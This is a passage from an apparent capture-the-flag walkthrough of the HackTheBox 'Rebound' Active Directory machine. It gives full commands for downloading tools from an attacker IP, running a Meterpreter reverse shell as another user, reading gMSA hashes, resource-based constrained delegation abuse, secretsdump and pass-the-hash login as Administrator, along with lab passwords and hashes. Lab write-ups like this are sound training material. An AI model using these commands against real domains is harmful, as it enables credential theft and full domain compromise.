hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt -w 3 -O
```
![Tbrady account](/assets/img/Rebound/Rebound_21.png)


### Tbrady -> Delegator$

From the previous bloodhound output we know that Tbrady has access to read the credentials of the delegator account. We would be able to capture this password using the [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) tool. To make this work we need to first get an interactive shell as the tbrady user. One catch here is that Tbrady is not allowed to user winrm so we need to use [RunasCS](https://github.com/antonioCoco/RunasCs) To run a process as tbrady without needing an interactive shell.

So first of all we need to do is download our RunasCs.exe binary onto the target machine.

```powershell
wget "http://10.10.14.227/RunasCs.exe" -outfile "RunasCs.exe"
```
Next we need to move copy our Meterpreter reverse shell to a location where tbrady would be able to execute it. Additionally we need to give tbrady also permissions to execute it.

```powershell
copy .\Calico.exe c:\windows\temp\Calico.exe
icacls "c:\windows\temp\Calico.exe" /grant rebound\tbrady:F
```
Next up we can run the following command to open a reverse shell as tbrady.

```powershell
.\RunasCs.exe tbrady '543BOMBOMBUNmanda' "c:\windows\temp\Calico.exe"
```

![Shell as Tbrady](/assets/img/Rebound/Rebound_22.png)


We now have our shell as tbrady we need to download our GMSAPasswordReader.exe exe file to the target machine using wget.

```powershell 
wget "http://10.10.14.227/GMSAPasswordReader.exe" -outfile "GMSAPasswordReader.exe"
```

Next we run the tool with the accountname **delegator$**. We'll get all the hashes of this user. Keep in mind that the **rc4_hmac** hash matches **LM** hash so we can use this in pass the hash attacks.

```powershell
.\GMSAPasswordReader.exe --AccountName delegator$
```

![Delegator hashes obtained](/assets/img/Rebound/Rebound_23.png)

## Privilege escalation through Resource Based Constrained Delegation

As we saw before the delegator$ machine account has the permissions to perform some delegation. However it doesn't have strong enough delegation permissions but we can however use it give another user the full delegation permissions. For this we will be giving ldap_monitor the full blown delegation permissions. First we need to get a TGT for the delegator account.

```powershell
impacket-getTGT 'rebound.htb/delegator$@dc01.rebound.htb' -hashes :E1630B0E18242439A50E9D8B5F5B7524 -dc-ip 10.10.11.231
```
![Delegator ticket obtained](/assets/img/Rebound/Rebound_24.png)

Next we need to change our **KRB5CCNAME** variable to include our newly created ticket.

```bash 
export KRB5CCNAME=$(pwd)/delegator\$@dc01.rebound.htb.ccache
```

After long debugging I figured out that **impacket-rbcd** does not like ldaps so we have to patch the **init_ldap_connection** in this script to the following code and it should work again.

```python
def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash):
    user = '%s\\%s' % (domain, username)
    connect_to = target
    if args.dc_ip is not None:
        connect_to = args.dc_ip
    if tls_version is not None:
        use_ssl = True
        port = 636
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
    else:
        use_ssl = False
        port = 389
        tls = None
    ldap_server = ldap3.Server(connect_to, get_info=ldap3.ALL, port=port, use_ssl=use_ssl, tls=tls)
    if args.k:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, args.aesKey, kdcHost=args.dc_ip)
    elif args.hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    return ldap_server, ldap_session
```

After patching this code we can run the following command to give the user ldap_monitor unrestricted delegation permissions.

```bash
python3 rbcd.py 'rebound.htb/delegator$' -k -no-pass -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip 10.10.11.231 -debug
```

![RBCD added to ldap_monitor](/assets/img/Rebound/Rebound_25.png)


Next we get a tgt ticket of ldap_monitor before we start using this account for delegations. When asked supply the password.
```bash
impacket-getTGT 'rebound.htb/ldap_monitor@dc01.rebound.htb'  -dc-ip 10.10.11.231
1GR8t@$$4u
```

Next up we'll ask for a service ticket whilst impersonating the domaincontrollers machine account (dc01$). This command, if everything went right, will output a new ticket but this time belonging to the machine account of dc01.

```bash
KRB5CCNAME=ldap_monitor@dc01.rebound.htb.ccache impacket-getST -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass -dc-ip 10.10.11.231
```

![Service Ticket generated](/assets/img/Rebound/Rebound_26.png)

This service ticket does not have enough permission to full access to domain controller like we want. So now we use the additional-ticket function to leverage our old service ticket with the permissions of the delegator account to upgrade this ticket to a TGT we can use to connect to the domain controller.

```bash
KRB5CCNAME=dc01\$.ccache impacket-getST -spn "http/dc01.rebound.htb" -impersonate "dc01$" -additional-ticket "dc01$.ccache" "rebound.htb/delegator$" -k -no-pass -hashes :E1630B0E18242439A50E9D8B5F5B7524 -dc-ip 10.10.11.231
```
![DC TGT generated](/assets/img/Rebound/Rebound_27.png)

Now using this ticket we can use impackets secretsdump to dump the ntlm hash of the Administrator user.

```bash
KRB5CCNAME=dc01\$.ccache impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-user administrator
```
![Administrator hash obtained](/assets/img/Rebound/Rebound_28.png)

Now that we have the Administrators NTLM hash we can use evil-winrm again to connect to the machine using a pass the hash attack. Perform the following command to connect to the domain controller as administrator.

```
evil-winrm  -i 10.10.11.231 -u Administrator -H 176be138594933bb67db3b2572fc91b8
```

![Administrator hash obtained](/assets/img/Rebound/Rebound_29.png)
